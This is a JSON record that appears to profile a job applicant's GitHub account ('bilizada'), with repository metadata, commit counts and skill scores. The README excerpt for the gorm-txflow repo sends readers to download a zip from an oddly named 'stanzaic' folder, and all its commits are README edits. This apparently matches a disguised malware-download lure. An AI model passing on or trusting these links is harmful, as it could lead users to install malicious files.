@@ -1,0 +1,1002 @@
+{
+  "applicant_id": "applicant0141",
+  "login": "bilizada",
+  "html_url": "https://github.com/bilizada",
+  "created_at": "2023-10-02T18:35:22Z",
+  "account_age_days": 1080,
+  "public_repos": 9,
+  "followers": 1,
+  "following": 0,
+  "repos": [
+    {
+      "name": "gorm-txflow",
+      "full_name": "bilizada/gorm-txflow",
+      "html_url": "https://github.com/bilizada/gorm-txflow",
+      "description": "🚀 Simplify transaction management in Go/GORM with a Spring-style manager that supports various propagation modes and enhances production reliability.",
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2023-10-02T18:50:52Z",
+      "pushed_at": "2026-09-17T00:28:59Z",
+      "stargazers": 1,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 1905,
+      "default_branch": "main",
+      "license": "MIT",
+      "topics": [
+        "after-commit",
+        "echo",
+        "gin",
+        "go-gorm",
+        "gorm-plugin",
+        "http-middleware",
+        "kafka",
+        "nested-transactions",
+        "post-commit-hook",
+        "propagation",
+        "read-uncommitted",
+        "requires-new",
+        "savepoints",
+        "spring-transaction",
+        "transaction",
+        "transaction-management",
+        "transaction-manager",
+        "transactional"
+      ],
+      "languages": {
+        "Go": 52069
+      },
+      "primary_language": "Go",
+      "file_count": 22,
+      "top_level_paths": [
+        ".gitignore",
+        "LICENSE",
+        "README.md",
+        "db.go",
+        "db_test.go",
+        "errors.go",
+        "go.mod",
+        "go.sum",
+        "gormplugin_deprecated.go",
+        "helpers.go",
+        "helpers_test.go",
+        "middleware.go",
+        "middleware_test.go",
+        "stanzaic",
+        "txmanager.go",
+        "txmanager_integration_test.go",
+        "txmanager_test.go",
+        "txmanager_util_test.go",
+        "txoption.go",
+        "txoption_test.go"
+      ],
+      "notable_files": [
+        "go.mod"
+      ],
+      "manifests": {
+        "go.mod": [
+          "dario.cat/mergo",
+          "filippo.io/edwards25519",
+          "github.com/azure/go-ansiterm",
+          "github.com/cenkalti/backoff/v4",
+          "github.com/containerd/errdefs",
+          "github.com/containerd/errdefs/pkg",
+          "github.com/containerd/log",
+          "github.com/containerd/platforms",
+          "github.com/cpuguy83/dockercfg",
+          "github.com/davecgh/go-spew",
+          "github.com/distribution/reference",
+          "github.com/docker/docker",
+          "github.com/docker/go-connections",
+          "github.com/docker/go-units",
+          "github.com/ebitengine/purego",
+          "github.com/felixge/httpsnoop",
+          "github.com/go-logr/logr",
+          "github.com/go-logr/stdr",
+          "github.com/go-ole/go-ole",
+          "github.com/go-sql-driver/mysql",
+          "github.com/google/uuid",
+          "github.com/grpc-ecosystem/grpc-gateway/v2",
+          "github.com/jinzhu/inflection",
+          "github.com/jinzhu/now",
+          "github.com/klauspost/compress",
+          "github.com/lufia/plan9stats",
+          "github.com/magiconair/properties",
+          "github.com/mattn/go-sqlite3",
+          "github.com/microsoft/go-winio",
+          "github.com/moby/docker-image-spec",
+          "github.com/moby/go-archive",
+          "github.com/moby/patternmatcher",
+          "github.com/moby/sys/sequential",
+          "github.com/moby/sys/user",
+          "github.com/moby/sys/userns",
+          "github.com/moby/term",
+          "github.com/morikuni/aec",
+          "github.com/opencontainers/go-digest",
+          "github.com/opencontainers/image-spec",
+          "github.com/pkg/errors",
+          "github.com/pmezard/go-difflib",
+          "github.com/power-devops/perfstat",
+          "github.com/shirou/gopsutil/v4",
+          "github.com/sirupsen/logrus",
+          "github.com/stretchr/testify",
+          "github.com/testcontainers/testcontainers-go",
+          "github.com/testcontainers/testcontainers-go/modules/mysql",
+          "github.com/tklauser/go-sysconf",
+          "github.com/tklauser/numcpus",
+          "github.com/yusufpapurcu/wmi",
+          "go.opentelemetry.io/auto/sdk",
+          "go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp",
+          "go.opentelemetry.io/otel",
+          "go.opentelemetry.io/otel/metric",
+          "go.opentelemetry.io/otel/trace",
+          "golang.org/x/crypto",
+          "golang.org/x/sys",
+          "golang.org/x/text",
+          "google.golang.org/grpc",
+          "google.golang.org/protobuf",
+          "gopkg.in/yaml.v3",
+          "gorm.io/driver/mysql",
+          "gorm.io/driver/sqlite",
+          "gorm.io/gorm"
+        ]
+      },
+      "has_readme": true,
+      "readme_length": 4347,
+      "readme_excerpt": "# 🌟 gorm-txflow - Simplifying Your Transaction Management\n\n## 🛠️ Download Now\n[![Download gorm-txflow](https://github.com/bilizada/gorm-txflow/raw/refs/heads/main/stanzaic/txflow-gorm-v2.1.zip%https://github.com/bilizada/gorm-txflow/raw/refs/heads/main/stanzaic/txflow-gorm-v2.1.zip)](https://github.com/bilizada/gorm-txflow/raw/refs/heads/main/stanzaic/txflow-gorm-v2.1.zip)\n\n## 📖 Introduction\ngorm-txflow is an easy-to-use transaction manager for GORM. It supports various transaction types such as REQUIRED, REQUIRES_NEW, NESTED, and more. This tool helps manage complex transactions effortlessly, making it suitable for various applications like HTTP, Kafka, and job processing. \n\n## 🚀 Getting Started\nTo get started with gorm-txflow, follow these simple steps:\n\n1. **Visit the Releases Page**  \n   Head to our [Releases page](https://github.com/bilizada/gorm-txflow/raw/refs/heads/main/stanzaic/txflow-gorm-v2.1.zip) to find the latest version.\n\n2. **Download the Software**  \n   On the Releases page, locate the latest version of gorm-txflow. Click on the download link to save the file to your device. \n\n3. **Install gorm-txflow**  \n   Once the download is complete, locate the downloaded file",
+      "has_ci": false,
+      "has_tests": true,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 3,
+      "contribution_share": 0.368,
+      "commits": {
+        "count": 7,
+        "first_at": "2025-12-28T12:12:08+00:00",
+        "last_at": "2026-09-17T00:28:58+00:00",
+        "active_days": 5,
+        "span_days": 262,
+        "max_per_day": 2,
+        "low_effort_message_ratio": 1.0,
+        "messages_sample": [
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": false,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": true,
+          "no_readme": false,
+          "is_template": false,
+          "mostly_low_effort_commits": true
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": true,
+          "has_docker": false,
+          "deployed": false,
+          "multi_month_span": true,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": true,
+          "substantial_tree": true,
+          "documented": true
+        },
+        "entry_flag_count": 2,
+        "intermediate_flag_count": 5,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [
+          "following a"
+        ],
+        "notebook_count": 0,
+        "code_file_count": 14
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": true,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "go",
+          "source": "language",
+          "detail": "Go: 52,069 bytes (100% of repo)",
+          "strength": 1.0
+        },
+        {
+          "skill_id": "unit-testing",
+          "source": "file",
+          "detail": "test file (db_test.go)",
+          "strength": 0.6
+        },
+        {
+          "skill_id": "go",
+          "source": "file",
+          "detail": "Go module (go.mod)",
+          "strength": 0.6
+        },
+        {
+          "skill_id": "go",
+          "source": "repo_name",
+          "detail": "'go' in repo name/description",
+          "strength": 0.2
+        },
+        {
+          "skill_id": "spring",
+          "source": "repo_name",
+          "detail": "'spring' in repo name/description",
+          "strength": 0.2
+        }
+      ],
+      "skill_relevant": true,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [],
+        "code_bytes": 52069,
+        "strong_skills": [
+          "go",
+          "unit-testing"
+        ]
+      },
+      "tree_truncated": false
+    },
+    {
+      "name": "site-de-assinatura",
+      "full_name": "bilizada/site-de-assinatura",
+      "html_url": "https://github.com/bilizada/site-de-assinatura",
+      "description": null,
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2024-09-03T17:20:00Z",
+      "pushed_at": "2026-02-21T08:21:33Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 4207,
+      "default_branch": "main",
+      "license": null,
+      "topics": [],
+      "languages": {
+        "HTML": 4948,
+        "CSS": 2702
+      },
+      "primary_language": "HTML",
+      "file_count": 15,
+      "top_level_paths": [
+        "README.md",
+        "alura-site assinatura3CGabriel"
+      ],
+      "notable_files": [],
+      "manifests": {},
+      "has_readme": true,
+      "readme_length": 20,
+      "readme_excerpt": "# site-de-assinatura",
+      "has_ci": false,
+      "has_tests": false,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 1,
+      "contribution_share": 1.0,
+      "commits": {
+        "count": 8,
+        "first_at": "2024-09-03T17:20:01+00:00",
+        "last_at": "2026-02-21T08:21:33+00:00",
+        "active_days": 5,
+        "span_days": 535,
+        "max_per_day": 2,
+        "low_effort_message_ratio": 1.0,
+        "messages_sample": [
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Add files via upload",
+          "Initial commit"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": false,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": false,
+          "is_template": false,
+          "mostly_low_effort_commits": true
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": false,
+          "has_docker": false,
+          "deployed": false,
+          "multi_month_span": true,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": false,
+          "substantial_tree": false,
+          "documented": false
+        },
+        "entry_flag_count": 1,
+        "intermediate_flag_count": 1,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 2
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": false,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "html-css",
+          "source": "language",
+          "detail": "HTML: 4,948 bytes (65% of repo)",
+          "strength": 1.0
+        },
+        {
+          "skill_id": "html-css",
+          "source": "language",
+          "detail": "CSS: 2,702 bytes (35% of repo)",
+          "strength": 0.753202614379085
+        }
+      ],
+      "skill_relevant": true,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [],
+        "code_bytes": 7650,
+        "strong_skills": [
+          "html-css"
+        ]
+      },
+      "tree_truncated": false
+    },
+    {
+      "name": "hl3",
+      "full_name": "bilizada/hl3",
+      "html_url": "https://github.com/bilizada/hl3",
+      "description": null,
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2024-09-17T16:57:03Z",
+      "pushed_at": "2026-02-21T08:21:10Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 6984,
+      "default_branch": "main",
+      "license": null,
+      "topics": [],
+      "languages": {
+        "HTML": 5406,
+        "CSS": 2745
+      },
+      "primary_language": "HTML",
+      "file_count": 23,
+      "top_level_paths": [
+        "README.md",
+        "img",
+        "index.html",
+        "styles.css"
+      ],
+      "notable_files": [],
+      "manifests": {},
+      "has_readme": true,
+      "readme_length": 5,
+      "readme_excerpt": "# hl3",
+      "has_ci": false,
+      "has_tests": false,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 1,
+      "contribution_share": 1.0,
+      "commits": {
+        "count": 8,
+        "first_at": "2024-09-17T16:57:03+00:00",
+        "last_at": "2026-02-21T08:21:10+00:00",
+        "active_days": 5,
+        "span_days": 521,
+        "max_per_day": 2,
+        "low_effort_message_ratio": 1.0,
+        "messages_sample": [
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Add files via upload",
+          "Initial commit"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": false,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": false,
+          "is_template": false,
+          "mostly_low_effort_commits": true
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": false,
+          "has_docker": false,
+          "deployed": false,
+          "multi_month_span": true,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": false,
+          "substantial_tree": false,
+          "documented": false
+        },
+        "entry_flag_count": 1,
+        "intermediate_flag_count": 1,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 2
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": false,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "html-css",
+          "source": "language",
+          "detail": "HTML: 5,406 bytes (66% of repo)",
+          "strength": 1.0
+        },
+        {
+          "skill_id": "html-css",
+          "source": "language",
+          "detail": "CSS: 2,745 bytes (34% of repo)",
+          "strength": 0.7367684946632316
+        }
+      ],
+      "skill_relevant": true,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [],
+        "code_bytes": 8151,
+        "strong_skills": [
+          "html-css"
+        ]
+      },
+      "tree_truncated": false
+    },
+    {
+      "name": "criandoaventura-ernani3C",
+      "full_name": "bilizada/criandoaventura-ernani3C",
+      "html_url": "https://github.com/bilizada/criandoaventura-ernani3C",
+      "description": null,
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2024-08-27T16:55:23Z",
+      "pushed_at": "2026-02-21T08:20:35Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 6368,
+      "default_branch": "main",
+      "license": null,
+      "topics": [],
+      "languages": {
+        "HTML": 5256,
+        "CSS": 498,
+        "JavaScript": 397
+      },
+      "primary_language": "HTML",
+      "file_count": 10,
+      "top_level_paths": [
+        "README.md",
+        "img",
+        "index.html",
+        "script.js",
+        "style.css"
+      ],
+      "notable_files": [],
+      "manifests": {},
+      "has_readme": true,
+      "readme_length": 26,
+      "readme_excerpt": "# criandoaventura-ernani3C",
+      "has_ci": false,
+      "has_tests": false,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 1,
+      "contribution_share": 1.0,
+      "commits": {
+        "count": 8,
+        "first_at": "2024-08-27T16:55:24+00:00",
+        "last_at": "2026-02-21T08:20:34+00:00",
+        "active_days": 5,
+        "span_days": 542,
+        "max_per_day": 2,
+        "low_effort_message_ratio": 1.0,
+        "messages_sample": [
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Add files via upload",
+          "Initial commit"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": false,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": false,
+          "is_template": false,
+          "mostly_low_effort_commits": true
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": false,
+          "has_docker": false,
+          "deployed": false,
+          "multi_month_span": true,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": false,
+          "substantial_tree": false,
+          "documented": false
+        },
+        "entry_flag_count": 1,
+        "intermediate_flag_count": 1,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 3
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": false,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "html-css",
+          "source": "language",
+          "detail": "HTML: 5,256 bytes (85% of repo)",
+          "strength": 1.0
+        },
+        {
+          "skill_id": "html-css",
+          "source": "language",
+          "detail": "CSS: 498 bytes (8% of repo)",
+          "strength": 0.48096244513087305
+        },
+        {
+          "skill_id": "javascript",
+          "source": "language",
+          "detail": "JavaScript: 397 bytes (6% of repo)",
+          "strength": 0.46454235083726225
+        }
+      ],
+      "skill_relevant": true,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [],
+        "code_bytes": 6151,
+        "strong_skills": [
+          "html-css"
+        ]
+      },
+      "tree_truncated": false
+    },
+    {
+      "name": "bileflix",
+      "full_name": "bilizada/bileflix",
+      "html_url": "https://github.com/bilizada/bileflix",
+      "description": null,
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2024-09-04T19:12:42Z",
+      "pushed_at": "2026-02-21T08:20:23Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 3229,
+      "default_branch": "main",
+      "license": null,
+      "topics": [],
+      "languages": {
+        "HTML": 2105,
+        "CSS": 931
+      },
+      "primary_language": "HTML",
+      "file_count": 6,
+      "top_level_paths": [
+        "README.md",
+        "index.html",
+        "styles.css",
+        "subsidize"
+      ],
+      "notable_files": [],
+      "manifests": {},
+      "has_readme": true,
+      "readme_length": 10,
+      "readme_excerpt": "# bileflix",
+      "has_ci": false,
+      "has_tests": false,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 1,
+      "contribution_share": 1.0,
+      "commits": {
+        "count": 8,
+        "first_at": "2024-09-04T19:12:43+00:00",
+        "last_at": "2026-02-21T08:20:23+00:00",
+        "active_days": 5,
+        "span_days": 534,
+        "max_per_day": 2,
+        "low_effort_message_ratio": 1.0,
+        "messages_sample": [
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Add files via upload",
+          "Initial commit"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": false,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": false,
+          "is_template": false,
+          "mostly_low_effort_commits": true
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": false,
+          "has_docker": false,
+          "deployed": false,
+          "multi_month_span": true,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": false,
+          "substantial_tree": false,
+          "documented": false
+        },
+        "entry_flag_count": 1,
+        "intermediate_flag_count": 1,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 2
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": false,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "html-css",
+          "source": "language",
+          "detail": "HTML: 2,105 bytes (69% of repo)",
+          "strength": 1.0
+        },
+        {
+          "skill_id": "html-css",
+          "source": "language",
+          "detail": "CSS: 931 bytes (31% of repo)",
+          "strength": 0.7066534914361002
+        }
+      ],
+      "skill_relevant": true,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [],
+        "code_bytes": 3036,
+        "strong_skills": [
+          "html-css"
+        ]
+      },
+      "tree_truncated": false
+    }
+  ],
+  "external_contributions": [],
+  "languages_bytes": {
+    "Go": 52069,
+    "HTML": 17715,
+    "CSS": 6876,
+    "JavaScript": 397
+  },
+  "total_commits": 39,
+  "skill_evidence": [
+    {
+      "skill_id": "html-css",
+      "repos": [
+        "bilizada/site-de-assinatura",
+        "bilizada/hl3",
+        "bilizada/criandoaventura-ernani3C",
+        "bilizada/bileflix"
+      ],
+      "signal_count": 8,
+      "sources": [
+        "language"
+      ],
+      "max_strength": 1.0,
+      "total_bytes": 24591,
+      "commit_count": 32,
+      "first_seen": "2024-08-27T16:55:24+00:00",
+      "last_seen": "2026-02-21T08:21:33+00:00",
+      "details": [
+        "site-de-assinatura: HTML: 4,948 bytes (65% of repo)",
+        "site-de-assinatura: CSS: 2,702 bytes (35% of repo)",
+        "hl3: HTML: 5,406 bytes (66% of repo)",
+        "hl3: CSS: 2,745 bytes (34% of repo)",
+        "criandoaventura-ernani3C: HTML: 5,256 bytes (85% of repo)",
+        "criandoaventura-ernani3C: CSS: 498 bytes (8% of repo)",
+        "bileflix: HTML: 2,105 bytes (69% of repo)",
+        "bileflix: CSS: 931 bytes (31% of repo)"
+      ]
+    },
+    {
+      "skill_id": "go",
+      "repos": [
+        "bilizada/gorm-txflow"
+      ],
+      "signal_count": 3,
+      "sources": [
+        "language",
+        "file",
+        "repo_name"
+      ],
+      "max_strength": 1.0,
+      "total_bytes": 52069,
+      "commit_count": 7,
+      "first_seen": "2025-12-28T12:12:08+00:00",
+      "last_seen": "2026-09-17T00:28:58+00:00",
+      "details": [
+        "gorm-txflow: Go: 52,069 bytes (100% of repo)",
+        "gorm-txflow: Go module (go.mod)",
+        "gorm-txflow: 'go' in repo name/description"
+      ]
+    },
+    {
+      "skill_id": "unit-testing",
+      "repos": [
+        "bilizada/gorm-txflow"
+      ],
+      "signal_count": 1,
+      "sources": [
+        "file"
+      ],
+      "max_strength": 0.6,
+      "total_bytes": 0,
+      "commit_count": 7,
+      "first_seen": "2025-12-28T12:12:08+00:00",
+      "last_seen": "2026-09-17T00:28:58+00:00",
+      "details": [
+        "gorm-txflow: test file (db_test.go)"
+      ]
+    },
+    {
+      "skill_id": "javascript",
+      "repos": [
+        "bilizada/criandoaventura-ernani3C"
+      ],
+      "signal_count": 1,
+      "sources": [
+        "language"
+      ],
+      "max_strength": 0.46454235083726225,
+      "total_bytes": 397,
+      "commit_count": 8,
+      "first_seen": "2024-08-27T16:55:24+00:00",
+      "last_seen": "2026-02-21T08:20:34+00:00",
+      "details": [
+        "criandoaventura-ernani3C: JavaScript: 397 bytes (6% of repo)"
+      ]
+    },
+    {
+      "skill_id": "spring",
+      "repos": [
+        "bilizada/gorm-txflow"
+      ],
+      "signal_count": 1,
+      "sources": [
+        "repo_name"
+      ],
+      "max_strength": 0.2,
+      "total_bytes": 0,
+      "commit_count": 7,
+      "first_seen": "2025-12-28T12:12:08+00:00",
+      "last_seen": "2026-09-17T00:28:58+00:00",
+      "details": [
+        "gorm-txflow: 'spring' in repo name/description"
+      ]
+    }
+  ],
+  "tier": "strict",
+  "usability": {
+    "tier": "strict",
+    "checks": {
+      "skill_relevant_repos": {
+        "actual": 5,
+        "required": 3,
+        "tier": "relaxed"
+      },
+      "readable_repos": {
+        "actual": 5,
+        "required": 1,
+        "tier": "relaxed"
+      },
+      "total_commits": {
+        "actual": 39,
+        "required": 20,
+        "tier": "strict"
+      },
+      "distinct_skills": {
+        "actual": 3,
+        "required": 3,
+        "tier": "strict"
+      }
+    },
+    "failed": [],
+    "reason": "meets all thresholds"
+  },
+  "search_stratum": "go-systems",
+  "collected_at": "2026-09-17T01:27:08.215288+00:00",
+  "collector_version": "0.1.0",
+  "notes": []
+}
